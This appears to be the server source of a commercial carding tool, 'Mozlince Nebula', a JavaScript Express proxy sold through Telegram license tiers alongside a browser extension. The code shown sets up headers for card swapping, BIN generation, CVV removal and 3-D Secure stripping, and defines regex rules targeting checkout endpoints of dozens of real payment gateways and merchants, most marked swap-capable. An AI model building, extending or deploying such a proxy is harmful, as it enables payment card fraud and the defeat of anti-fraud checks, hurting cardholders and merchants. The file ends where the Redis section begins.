/* ═══════════════════════════════════════════════════════════════
   ✦ MOZLINCE NEBULA  ·  v8.5.1 QUANTUM+
   © Asheo Systems · Premium License Engine & 3DS Proxy
   ───────────────────────────────────────────────────────────────
   ◈ Compatível com a extensão Asheo v1.6.2 (API_BASE = mozlince.onrender.com)
   ◈ Correções aplicadas em v8.5.1:
     [1] Rotas Express 4: substituído *splat por * (BUG crítico)
     [2] Inject condicional: não sobrescreve encryptedCardNumber/adyenToken
     [3] Form inject: só sobrescreve campos mascarados/vazios (não length<4)
     [4] Repassa location/set-cookie/www-authenticate do upstream
     [5] Lê x-asheo-auth, x-asheo-origin, x-asheo-card, x-asheo-bin
     [6] specialHosts alinhado ao shape {host,pattern,name} da extensão
     [7] x-asheo-3ds-strip só filtra response (não request)
     [8] AbortController real no fetch upstream (timeout 15s)
     [9] content-type respeita o header da extensão (não default JSON)
     [10] setDeep com blacklist __proto__/constructor/prototype
     [11] AbortSignal.any para combinar timeout + client abort
     [12] isAllowedTarget mais estrito (sem SSRF via sufixo)
   ═══════════════════════════════════════════════════════════════ */
require('dotenv').config();
const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
app.set('trust proxy', 1); // Necessário para IP real no Render

const ALLOWED_HEADERS = [
  'Origin','X-Requested-With','Content-Type','Accept','Authorization','Asheo-Pass',
  'X-Install-Id','X-Client-Tag','X-License-Key','X-Request-Id','Accept-Language','Accept-Encoding',
  'x-asheo-target','x-asheo-method','x-asheo-install','x-asheo-ts','x-asheo-sig','x-asheo-build',
  'x-asheo-nonce','x-asheo-origin','x-asheo-auth','x-asheo-bin','x-asheo-card','x-asheo-clientkey',
  'x-asheo-special-hosts','x-asheo-headers','x-asheo-swap-only','x-asheo-3ds-strip',
  'x-asheo-remove-cvv','x-asheo-bt-host','x-asheo-pack-fmt','x-asheo-attest','x-asheo-session',
  'x-asheo-replay','X-Telegram-Bot-Api-Secret-Token'
].join(', ');

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', ALLOWED_HEADERS);
  res.setHeader('Access-Control-Expose-Headers', [
    'Content-Length','Content-Encoding','X-Request-Id','x-asheo-proxied','x-asheo-swapped',
    'x-asheo-swap-ok','x-asheo-pack-fmt','x-asheo-upstream-status','x-asheo-adyen-verdict',
    'x-asheo-adyen-result','x-asheo-adyen-reason','x-asheo-3ds2-verdict','x-asheo-3ds2-attempts',
    'x-asheo-3ds2-trail','x-asheo-elapsed-ms','x-asheo-3ds2-token','x-asheo-3ds2-payment-data'
  ].join(', '));
  res.setHeader('Access-Control-Max-Age', '86400');
  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.5.1');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Middleware para capturar rawBody em rotas de API normais
app.use((req, res, next) => {
  if (req.path.startsWith('/v1/gw') || req.path.startsWith('/v1/process')) return next(); // Proxy lida com raw
  express.json({ limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err) => {
    if (err) return next(err);
    express.urlencoded({ extended: false, limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err2) => {
      if (err2) return next(err2);
      express.text({ type: ['text/*','application/xml'], limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, next);
    });
  });
});

// Proxy precisa do body cru para não corromper forms
app.use('/v1/gw', express.raw({ type: '*/*', limit: '4mb' }));
app.use('/v1/process', express.raw({ type: '*/*', limit: '4mb' }));

/* ═══ DESIGN SYSTEM (logs) ═══ */
const C = { r:'\x1b[0m', b:'\x1b[1m', d:'\x1b[2m', gray:'\x1b[38;5;245m', dim:'\x1b[38;5;240m', violet:'\x1b[38;5;99m', violetB:'\x1b[38;5;135m', cyan:'\x1b[38;5;45m', cyanB:'\x1b[38;5;51m', gold:'\x1b[38;5;220m', goldB:'\x1b[38;5;226m', mint:'\x1b[38;5;121m', green:'\x1b[38;5;46m', rose:'\x1b[38;5;204m', red:'\x1b[38;5;196m', amber:'\x1b[38;5;214m', blue:'\x1b[38;5;39m' };
const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose, DM:C.rose, GW:C.cyanB, HMAC:C.amber, PROXY:C.violetB, GZIP:C.mint };
function log(t, m) { const ts = new Date().toISOString().replace('T',' ').substring(0,19); const tag = (TAGS[t]||C.gray) + C.b + '▸ ' + t.padEnd(7) + C.r; console.log(`${C.dim}${ts}${C.r} ${tag} ${m}`); }
function redactCard(obj) { try { const c = typeof obj === 'string' ? JSON.parse(obj) : obj; if (!c || typeof c !== 'object') return obj; const out = { ...c }; if (out.number) out.number = String(out.number).replace(/\d(?=\d{4})/g,'*'); if (out.cvv) out.cvv = '***'; if (out.cvc) out.cvc = '***'; if (out.holder) out.holder = String(out.holder).substring(0,2) + '***'; if (out.holderName) out.holderName = String(out.holderName).substring(0,2) + '***'; return out; } catch { return obj; } }
function banner() {
  console.log(`\n${C.violet}   ╭──────────────────────────────────────────────╮${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.5.1${C.r} ${C.dim}QUANTUM+${C.r} ${C.violet}│${C.r}`);
  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · Asheo Systems${C.r}     ${C.violet}│${C.r}`);
  console.log(`${C.violet}   ╰──────────────────────────────────────────────╯${C.r}\n`);
}

/* ═══ CHAVES ES256 ═══ */
let PRIVATE_KEY = null, PUBLIC_KEY = null, ORIGEM = 'nenhuma';
(function initKeys() {
  const fp = ['/etc/secrets/private.pem','./private.pem','/etc/secrets/ec_private.pem'];
  const fu = ['/etc/secrets/public.pem','./public.pem','/etc/secrets/ec_public.pem'];
  for (const f of fp) { try { if (fs.existsSync(f)) { PRIVATE_KEY = fs.readFileSync(f,'utf8').trim(); ORIGEM='file:'+f; break; } } catch {} }
  for (const f of fu) { try { if (fs.existsSync(f)) { PUBLIC_KEY = fs.readFileSync(f,'utf8').trim(); break; } } catch {} }
  if (!PRIVATE_KEY) { let p = process.env.EC_PRIVATE_KEY || process.env.JWT_PRIVATE_KEY_PEM || ''; if (p) { if (!p.includes('BEGIN')) { try { p = Buffer.from(p.trim(),'base64').toString('utf8'); } catch {} } PRIVATE_KEY = p.replace(/\\n/g,'\n').trim(); ORIGEM = 'env'; } }
  if (!PUBLIC_KEY) { let pu = process.env.EC_PUBLIC_KEY || process.env.JWT_PUBLIC_KEY_PEM || ''; if (pu) { if (!pu.includes('BEGIN')) { try { pu = Buffer.from(pu.trim(),'base64').toString('utf8'); } catch {} } PUBLIC_KEY = pu.replace(/\\n/g,'\n').trim(); } }
  if (PRIVATE_KEY) {
    try {
      const k = crypto.createPrivateKey(PRIVATE_KEY);
      const pubFromPriv = crypto.createPublicKey(k).export({ type:'spki', format:'pem' });
      const jwk = crypto.createPublicKey(k).export({ format:'jwk' });
      if (!PUBLIC_KEY) PUBLIC_KEY = pubFromPriv;
      log('OK', `Chave privada carregada (${ORIGEM}) · kid=${(jwk.x||'').slice(0,8)}…`);
    } catch (e) { log('ERRO','Chave privada inválida: '+e.message); PRIVATE_KEY = null; }
  } else { log('ERRO','Nenhuma chave privada encontrada — /v1/activate vai falhar 500'); }
  if (!PUBLIC_KEY) { log('WARN','PUBLIC_KEY ausente — verify usará PRIVATE_KEY'); PUBLIC_KEY = PRIVATE_KEY; }
})();

/* ═══ ENV ═══ */
const UPSTASH_URL = process.env.UPSTASH_REDIS_REST_URL;
const UPSTASH_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const TELEGRAM_WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';
const SERVER_URL = (process.env.SERVER_URL || 'https://mozlince.onrender.com').replace(/\/+$/,'');
const RULES_VERSION = 34;

/* ═══ CONSTANTES DE PLANO ═══ */
const FEATURE_KEYS = ['browserMods','ruleOpsLab','liveHud','advancedProtection','apiAccess','experimentalFeatures'];
const CAPABILITY_KEYS = ['adyenGateway','customEncryptedGateways','binGenerator'];
const LIMIT_KEYS = ['binPool','ccQueue','ruleLimit','profileLimit','randomRouting'];
const PREMIUM_SCOPE = ['bypasser','cardfiller','cvv','premium','browserMods','persona','rules','gateways','exclusive'];
const PREMIUM_LIMITS = { max_accounts:-1, daily_actions:-1, max_templates:-1, history_days:-1, export_limit:-1, binPool:null, ccQueue:null, ruleLimit:null, profileLimit:null, randomRouting:true };
const FREE_LIMITS = { max_accounts:1, daily_actions:20, max_templates:3, history_days:3, export_limit:5, binPool:2, ccQueue:10, ruleLimit:20, profileLimit:2, randomRouting:false };

const PACOTES = {
  '3d':   { nome:'3 Dias',    dias:3,     preco:3,   emoji:'◔', lifetime:false },
  '7d':   { nome:'7 Dias',    dias:7,     preco:5,   emoji:'◕', lifetime:false },
  '15d':  { nome:'15 Dias',   dias:15,    preco:7,   emoji:'◑', lifetime:false },
  '30d':  { nome:'30 Dias',   dias:30,    preco:12,  emoji:'◒', lifetime:false },
  '45d':  { nome:'45 Dias',   dias:45,    preco:17,  emoji:'◓', lifetime:false },
  '90d':  { nome:'3 Meses',   dias:90,    preco:30,  emoji:'✦', lifetime:false },
  '180d': { nome:'6 Meses',   dias:180,   preco:45,  emoji:'✧', lifetime:false },
  '1a':   { nome:'1 Ano',     dias:365,   preco:70,  emoji:'⟡', lifetime:false },
  'life': { nome:'LIFETIME',  dias:36500, preco:190, emoji:'∞', lifetime:true  }
};
const precoFmt = usd => `$${Number(usd || 0).toFixed(2)}`;

const PAYMENT_RULES = [
  { defaultId:"stripe.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Stripe", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.stripe\\.com|js\\.stripe\\.com|m\\.stripe\\.com|checkout\\.stripe\\.com)(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"worldpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Worldpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:hpp|payments|secure)\\.worldpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"endurance.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Endurance", patternEnc:{kind:"regex",source:"^https:\\/\\/securepay\\.svcs\\.endurance\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"safecharge.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Safecharge", patternEnc:{kind:"regex",source:"^https:\\/\\/secure\\.safecharge\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paddle.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Paddle", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout-service\\.paddle\\.com\\/[^?#]*\\/pay(?:[?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"adyen.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:checkoutshopper-live(?:-[a-z0-9]+)?\\.adyen\\.com|checkoutshopper-live(?:-[a-z0-9]+)?\\.cdn\\.adyen\\.com|pal-(?:test|live)\\.adyen\\.com)\\/(?:checkoutshopper\\/)?(?:v\\d+|pal\\/servlet)\\/(?:sessions\\/[^/]+\\/)?(?:payments|paymentMethods|payments\\/details|setup)(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"boosteroid.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Boosteroid Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/cloud\\.boosteroid\\.com\\/api\\/v2\\/payments\\/adyen\\/subscription\\/create(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"chess.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Chess.com Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/www\\.chess\\.com\\/payment\\/adyen\\/pay(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"gog.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"GOG Adyen", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.gog\\.com\\/v\\d+\\/checkout\\/[a-z0-9]+\\/payment(?:[/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"lootbar.adyen", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Lootbar", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.lootbar\\.com\\/api\\/v2\\/asset\\/pay\\/adyen\\/card\\/request(?:[\\/?#]|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xsolla.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xsolla", patternEnc:{kind:"regex",source:"^https:\\/\\/secure\\.xsolla\\.com\\/paystation2\\/api\\/.*$",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"recurly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Recurly", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:[a-z0-9.-]+\\.)?recurly\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/x-www-form-urlencoded", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tebex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Tebex", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout\\.tebex\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nordpayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NordPayments", patternEnc:{kind:"regex",source:"^https:\\/\\/iframe-api\\.nordpayments\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["primary_account_number","expiration_year","expiration_month","cvv"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"grammerly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Grammarly", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:gr4vy\\.app|gateway\\.grammarly\\.com|payments\\.grammarly\\.com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["payment_method.number","payment_method.expiration_date","payment_method.security_code"], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"rizzup.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"RizzUp", patternEnc:{kind:"regex",source:"^https:\\/\\/rizzup\\.net(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"fortis.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Fortis", patternEnc:{kind:"regex",source:"^https:\\/\\/api\\.fortis\\.tech(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"jsbasistheory.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Basis Theory", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|js)\\.basistheory\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"braintree.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Braintree", patternEnc:{kind:"regex",source:"^https:\\/\\/payments\\.braintree-api\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"mercadopago.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Mercado Pago", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|sdk)\\.mercadopago\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"xendit.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Xendit", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.xendit\\.co\\/v2\\/credit_card_tokens|pali-orchestrator-prod-live\\.xendit\\.co)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"razorpay.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Razorpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api|checkout|cdn)\\.razorpay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"paystack.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Paystack", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:standard|api|checkout|js)\\.paystack\\.(?:co|com)(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"payu.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"PayU India", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:test|secure|info|uat-partner)\\.payu\\.in(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"epicgames.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Epic Games", patternEnc:{kind:"regex",source:"^https:\\/\\/payment-website-pci\\.ol\\.epicgames\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"appsnetpk.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"IPG (apps.net.pk)", patternEnc:{kind:"regex",source:"^https:\\/\\/ipg\\d*\\.apps\\.net\\.pk(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"primer.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Primer", patternEnc:{kind:"regex",source:"^https:\\/\\/sdk\\.api\\.primer\\.io(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bluesnap.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BlueSnap", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:www1\\.)?bluesnap\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:["ccNumber"], inject:{"client_meta.app":"Asheo","client_meta.version":"1.0.0"}, removalFields:["debug","logs"], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"bridgerpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"BridgerPay", patternEnc:{kind:"regex",source:"^https:\\/\\/checkout\\.bridgerpay\\.com\\/api\\/(?:v2\\/deposit\\/credit-card|n\\/payment-details-cache)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"spreedly.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Spreedly", patternEnc:{kind:"regex",source:"^https:\\/\\/core\\.spreedly\\.com\\/v1\\/payment_methods(\\/restricted\\.json)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"openpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Openpay", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:sandbox-)?api\\.openpay\\.(?:mx|co|pe|com)(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:secure\\.)?nmi\\.com\\/api\\/transact\\.php",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"nmi.collectjs", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"NMI CollectJS", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:secure\\.)?nmi\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tailoredpay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TailoredPay", patternEnc:{kind:"regex",source:"^https:\\/\\/tailoredpay\\.transactiongateway\\.com\\/token\\/api\\/save_multipart_token(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"sagepay.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Opayo (Sage Pay)", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:live|test|pi-live|pi-test)\\.sagepay\\.com(?:\\/|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"viva.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Viva", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:demo-)?api\\.vivapayments\\.com\\/nativecheckout\\/v2\\/chargetokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"codapayments.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Codapayments", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api-tc|tc-api-card-sandbox)\\.codapayments\\.com\\/v1\\/(?:pub\\/)?direct\\/charges",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"checkout.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Checkout.com", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:api\\.(?:sandbox\\.)?|card-acquisition-gateway\\.)checkout\\.com\\/tokens",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"airwallex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Airwallex", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:[a-z0-9-]+\\.)*airwallex\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"tokenex.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"TokenEx", patternEnc:{kind:"regex",source:"^https:\\/\\/htp\\.tokenex\\.com\\/iframe\\/v3",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"cashfree.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Cashfree", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:sandbox\\.|api\\.|sdk\\.|payments\\.)?cashfree\\.com\\/(?:checkout\\/api\\/checkouts\\/payments\\/?)?",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"zuora.default", defaultVersion:2, isDefault:true, swapCapable:true, enabled:true, name:"Zuora", patternEnc:{kind:"regex",source:"^https:\\/\\/rest\\.(?:[a-z0-9-]+\\.)*zuora\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"vgs.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"VGS", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:vgsapi\\.com|[a-z0-9-]+\\.(?:sandbox|live)\\.verygoodproxy\\.com)\\/cards(?:[/?#]|$)",flags:"i"}, matchContentType:null, requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"patreon.default", defaultVersion:1, isDefault:true, swapCapable:true, enabled:true, name:"Patreon", patternEnc:{kind:"regex",source:"^https:\\/\\/(?:www\\.)?patreon\\.com(?:\\/|$)",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"] },
  { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"^https:\\/\\/api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
];

/* ── EXCLUSIVE_TARGETS: inclui variantes -us/-eu/-au e pal-* ── */
const EXCLUSIVE_TARGETS = [
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-us.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-eu.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live-au.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/sessions"},
  {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/paymentMethods"},
  {hostSuffix:"checkoutshopper-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
  {hostSuffix:"pal-test.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"},
  {hostSuffix:"pal-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/pal/servlet/"}
];

const GATEWAYS_META = [
  {id:'default-stripe',name:'Stripe',pattern:'https://js.stripe.com/*',enabled:true,isDefault:true},
  {id:'default-checkout',name:'Checkout.com',pattern:'https://*.checkout.com/*',enabled:true,isDefault:true},
  {id:'default-adyen',name:'Adyen',pattern:'https://*.adyen.com/*',enabled:true,isDefault:true},
  {id:'default-braintree',name:'Braintree',pattern:'https://*.braintreegateway.com/*',enabled:true,isDefault:true}
];

const CAMPAIGNS = [{id:'default-1',name:'Default Campaign',enabled:true,createdAt:new Date().toISOString()}];

/* ═══ REDIS (Upstash REST) ═══ */
